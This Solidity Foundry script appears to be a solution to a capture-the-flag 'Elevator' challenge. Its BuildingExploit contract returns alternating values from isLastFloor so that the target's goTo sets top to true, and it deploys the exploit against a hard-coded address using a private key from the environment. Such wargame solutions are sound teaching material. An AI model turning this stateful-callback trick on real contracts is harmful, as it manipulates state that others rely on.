// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "../src/Elevator.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract BuildingExploit {
    Elevator public elevator;
    bool public ck = true;

    constructor(address _target) {
        elevator = Elevator(_target);
    }

    function isLastFloor(uint) external returns (bool) {
        ck = !ck;
        return ck;
    }

    function attack() public {
        elevator.goTo(1);
    }

    function check() public view returns (bool) {
        return elevator.top();
    }
}

contract ElevatorSolution is Script {
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        BuildingExploit buildingExploit = new BuildingExploit(0x99b46abE86E49cE4CcCb325f447e9D29c2c7cD71);

        console.log("Top before attack() : ", buildingExploit.check());

        buildingExploit.attack();

        console.log("Top after attack() : ", buildingExploit.check());

        vm.stopBroadcast();
    }
}